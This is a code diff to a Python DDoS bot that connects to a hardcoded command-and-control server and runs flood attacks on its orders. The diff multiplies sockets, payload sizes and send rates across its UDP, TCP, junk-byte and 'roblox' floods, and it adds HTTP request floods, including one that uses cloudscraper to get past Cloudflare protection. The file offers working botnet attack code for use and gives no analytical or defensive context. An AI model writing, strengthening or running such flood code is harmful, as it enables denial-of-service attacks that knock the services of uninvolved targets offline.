@@ -13,75 +13,94 @@ C2_ADDRESS = "147.185.221.27"
 C2_PORT = 4887
 
 def attack_udp(ip, port, secs, size=65500):
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    end_time = time.time() + secs
+    sockets = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(100)]  # More sockets
+    while time.time() < end_time:
         dport = random.randint(1, 65535) if port == 0 else port
-        data = random._urandom(size)
-        s.sendto(data, (ip, dport))
+        data = random._urandom(size * 3)  # Triple size
+        for s in sockets:
+            s.sendto(data, (ip, dport))
 
 def attack_tcp(ip, port, secs, size=65500):
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    end_time = time.time() + secs
+    while time.time() < end_time:
+        sockets = [socket.socket(socket.AF_INET, socket.SOCK_STREAM) for _ in range(50)]
         try:
-            s.connect((ip, port))
-            while time.time() < secs:
-                s.send(random._urandom(size))
+            for s in sockets:
+                s.connect((ip, port))
+                while time.time() < end_time:
+                    s.send(random._urandom(size * 2))  # Double size
         except:
             pass
+        finally:
+            for s in sockets:
+                s.close()
 
 def attack_tup(ip, port, secs, size=65500):
-    while time.time() < secs:
-        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    end_time = time.time() + secs
+    while time.time() < end_time:
+        udp_socks = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(50)]
+        tcp_socks = [socket.socket(socket.AF_INET, socket.SOCK_STREAM) for _ in range(50)]
         dport = random.randint(1, 65535) if port == 0 else port
+        data = random._urandom(size * 3)
         try:
-            data = random._urandom(size)
-            tcp.connect((ip, port))
-            udp.sendto(data, (ip, dport))
-            tcp.send(data)
+            for tcp in tcp_socks:
+                tcp.connect((ip, port))
+            for _ in range(5000):  # High burst
+                for udp in udp_socks:
+                    udp.sendto(data, (ip, dport))
+                for tcp in tcp_socks:
+                    tcp.send(data)
         except:
             pass
+        finally:
+            for s in udp_socks + tcp_socks:
+                s.close()
 
 def attack_hex(ip, port, secs):
-    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
+    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01' * 1000  # Amplify payload
+    end_time = time.time() + secs
+    sockets = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(100)]
+    while time.time() < end_time:
+        for s in sockets:
+            for _ in range(10):  # Multi-send
+                s.sendto(payload, (ip, port))
 
 def attack_roblox(ip, port, secs, size=65400):
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(size)
+    end_time = time.time() + secs
+    sockets = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(100)]  # More sockets
+    while time.time() < end_time:
+        bytes = random._urandom(size * 3)  # Triple size
         dport = random.randint(1, 65535) if port == 0 else port
-        for _ in range(1500):
+        for _ in range(5000):  # Increased iterations
             ran = random.randrange(10 ** 80)
             hex = "%064x" % ran
             hex = hex[:64]
-            s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))
+            payload = bytes.fromhex(hex) + bytes
+            for s in sockets:
+                s.sendto(payload, (ip, dport))
 
 def attack_junk(ip, port, secs):
-    payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
+    payload = b'\x00' * 65535  # Max junk payload
+    end_time = time.time() + secs
+    sockets = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(100)]
+    while time.time() < end_time:
+        for s in sockets:
+            for _ in range(10):  # Multi-send
+                s.sendto(payload, (ip, port))
+
+def REQ_attack(url, secs, port):
+    end_time = time.time() + secs
+    while time.time() < end_time:
+        for _ in range(1000):  # High request rate
+            requests.get(url)
+
+def CFB(url, secs, port):
+    end_time = time.time() + secs
+    scraper = cloudscraper.create_scraper()
+    while time.time() < end_time:
+        for _ in range(1000):  # High request rate
+            scraper.get(url)
 
 def handle_c2_connection(c2):
     try:
@@ -139,8 +158,6 @@ def handle_c2_connection(c2):
                 threads = int(args[4])
                 for _ in range(threads):
                     threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
-                    threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
-                    threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
             elif command == "!HTTP_REQ":
                 url = args[1]
                 port = args[2]
